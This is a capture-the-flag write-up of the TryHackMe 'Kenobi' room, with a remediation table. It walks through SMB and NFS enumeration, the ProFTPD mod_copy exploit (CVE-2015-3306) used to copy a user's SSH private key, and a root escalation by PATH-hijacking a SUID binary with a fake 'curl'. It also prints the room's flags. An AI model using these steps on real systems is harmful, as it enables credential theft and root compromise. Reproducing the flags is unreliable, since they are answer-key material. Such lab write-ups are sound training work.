# Kenobi | TryHackMe Write-up

> **TL;DR:** Enumerated an anonymous SMB share and an exposed NFS export on a Linux host, abused the ProFTPD `mod_copy` vulnerability (CVE-2015-3306) to stage Kenobi's SSH private key into an NFS-readable directory for initial access, then escalated to root by PATH-hijacking a custom SUID binary (`/usr/bin/menu`).

|  |  |
|---|---|
| **Platform** | TryHackMe |
| **Room** | [Kenobi](https://tryhackme.com/room/kenobi) |
| **Difficulty** | Easy |
| **Category** | Linux · boot2root |
| **Date completed** | 2026-07-05 |
| **Author** | Kevin Jose |

**Tools used:** `nmap` · `smbclient` · `searchsploit` · `netcat (nc)` · `mount` · `ssh` · Linux CLI
**Vulnerabilities covered:** Anonymous SMB access (CWE-306) · Exposed NFS export / sensitive file disclosure (CWE-552) · ProFTPD `mod_copy` arbitrary file copy (CVE-2015-3306) · SUID PATH hijacking (CWE-426)

---

## 1. Overview

Kenobi is an Easy-rated Linux boot2root; the objective is to capture the user and root flags. The attack path chains three misconfigurations: an anonymous SMB share leaks a log file that confirms the service layout, an exposed NFS export (`/var`) provides a readable staging location, and the ProFTPD `mod_copy` flaw lets an unauthenticated attacker copy Kenobi's SSH key into that NFS-readable path for SSH access. Privilege escalation is then achieved by hijacking the `PATH` of a root-owned SUID binary.

> **Note:** TryHackMe assigns a fresh IP each time the machine is deployed, so the target address differs between screenshots. Commands below use `$IP` as a placeholder — set it once per session with `export IP=<machine-ip>` and every command resolves automatically.

---

## 2. Reconnaissance

**Connectivity check**

```bash
ping -c 3 $IP
```

**Service scan**

```bash
nmap -sV $IP
```

The scan showed **7 open ports**, including SSH (22), HTTP (80), RPCbind (111), SMB (445) and ProFTPD on FTP (21) — the three services (SMB, NFS, FTP) that form the attack path.

---

## 3. Enumeration

### Server Message Block (SMB) — port 445

Enumerate shares and users with Nmap's SMB scripts:

```bash
nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse $IP
```

List the shares with `smbclient`:

```bash
smbclient -L $IP
```

Three shares were found. The `anonymous` share allowed access without credentials:

```bash
smbclient //$IP/anonymous
# within the smb session:
get log.txt
```

`log.txt` confirmed the ProFTPD configuration and the location of Kenobi's SSH keys — useful context for the foothold.

### Network File System (NFS) — via RPCbind, port 111

```bash
nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount $IP
```

The host exports **`/var`** over NFS — a location we can mount and read later.

### ProFTPD — port 21

```bash
searchsploit ProFTPd 1.3.5
```

`searchsploit` returned **4** results for ProFTPD 1.3.5, including the `mod_copy` module — this version is vulnerable to CVE-2015-3306.

---

## 4. Exploitation — Initial Foothold

**Vulnerability:** ProFTPD 1.3.5 `mod_copy` — **CVE-2015-3306**
**Weakness:** Improper access control on the `SITE CPFR` / `SITE CPTO` commands (unauthenticated arbitrary file copy)

**Why it works:** The `mod_copy` module in ProFTPD 1.3.5 exposes the `SITE CPFR` and `SITE CPTO` commands without requiring authentication. An unauthenticated attacker can use them to copy arbitrary files on the server — here, copying Kenobi's private SSH key out of his home directory into a location readable through the NFS export.

**Steps**

1. Connect to the FTP service and use `mod_copy` to stage Kenobi's SSH private key into the NFS-exported `/var` tree:

   ```bash
   nc $IP 21
   # inside the FTP session:
   SITE CPFR /home/kenobi/.ssh/id_rsa
   SITE CPTO /var/tmp/id_rsa
   ```

2. Mount the exposed NFS `/var` share locally:

   ```bash
   mkdir /mnt/kenobiNFS
   mount $IP:/var /mnt/kenobiNFS
   ls -la /mnt/kenobiNFS
   ```

3. Copy the staged key to the working directory and fix its permissions (SSH refuses world-readable private keys):

   ```bash
   cp /mnt/kenobiNFS/tmp/id_rsa .
   chmod 600 id_rsa
   ```

4. Authenticate over SSH as `kenobi` using the recovered key:

   ```bash
   ssh -i id_rsa kenobi@$IP
   ```

**Result:** SSH shell as `kenobi`. The user flag is at `/home/kenobi/user.txt`.

**User flag:** `d0b0f3f53b6caa532a83915e19224899`

---

## 5. Privilege Escalation

**Enumeration for escalation vectors**

```bash
find / -perm -u=s -type f 2>/dev/null
```

This lists all SUID binaries. A non-standard binary, **`/usr/bin/menu`**, stood out. Running it presented a small menu of options:

```bash
/usr/bin/menu
```

**Vector:** PATH hijacking of the SUID binary `/usr/bin/menu`. The binary calls `curl` **without an absolute path**, so it resolves the command via `$PATH`.

**Why it works:** `/usr/bin/menu` has the SUID bit set and is owned by root, so any command it launches inherits root privileges. By placing a malicious `curl` earlier in `$PATH`, the binary executes attacker-controlled code as root.

**Steps**

1. Create a malicious `curl` that spawns a shell, in a writable directory, and make it executable:

   ```bash
   cd /tmp
   echo /bin/sh > curl
   chmod +x curl
   ```

2. Prepend the writable directory to `$PATH` so the malicious `curl` is found first:

   ```bash
   export PATH=/tmp:$PATH
   ```

3. Re-run the SUID binary, which now executes the malicious `curl` as root:

   ```bash
   /usr/bin/menu
   id
   ```

**Result:** Root shell (`uid=0`). The root flag is at `/root/root.txt`.

**Root flag:** `177b3cd8562289f37382721c28381f02`

---

## 6. Remediation

| Finding | Risk | Remediation |
|---|---|---|
| Anonymous SMB share | Unauthorized access to sensitive files and credentials | Disable anonymous access, enforce authentication, and apply least-privilege permissions on SMB shares. |
| Exposed NFS export (`/var`) | Sensitive data disclosure and unauthorized file access | Restrict NFS exports to trusted hosts, set correct export permissions, and avoid exporting sensitive directories. |
| ProFTPD `mod_copy` (CVE-2015-3306) | Unauthenticated file copy leading to information disclosure or RCE | Upgrade ProFTPD to a patched release, disable `mod_copy` if it is not required, and keep services patched. |
| SSH private key in an accessible location | Unauthorized authentication / account compromise | Store private keys securely, enforce `600` permissions, and never expose them through network shares or temp directories. |
| Misconfigured SUID binary (`/usr/bin/menu`) | Local privilege escalation to root | Remove unnecessary SUID bits, review custom SUID binaries, and always invoke external commands by absolute path to prevent PATH hijacking. |
| Weak system hardening | Increased attack surface | Audit and remove unused services/software, apply least privilege, and run routine vulnerability assessment and patch management. |

---

## 7. Lessons Learned

- SMB enumeration — especially anonymous access — can expose a lot of useful context (shares, service config, file locations) before any credentials are involved. I initially underestimated how much is reachable unauthenticated.
- I lost time during the FTP vs SMB vs NFS mapping phase working out where the vulnerable service was actually exposed, and probed the wrong ports before enumerating shares properly.
- This box sharpened my understanding of SUID + PATH-based privilege escalation, and how a small misconfiguration (a missing absolute path) leads straight to root.
- Next time I'll commit to structured enumeration up front (Nmap → SMB enum → service validation) instead of jumping between tools — it makes the exploitation path faster and more logical.

---

## 8. References

- Room: https://tryhackme.com/room/kenobi
- CVE-2015-3306 (ProFTPD `mod_copy`): https://nvd.nist.gov/vuln/detail/CVE-2015-3306
- CWE-426: Untrusted Search Path — https://cwe.mitre.org/data/definitions/426.html
- CWE-552: Files or Directories Accessible to External Parties — https://cwe.mitre.org/data/definitions/552.html

---

*Lab conducted in an authorised, isolated training environment (TryHackMe). All activity was performed against systems I am explicitly permitted to test.*
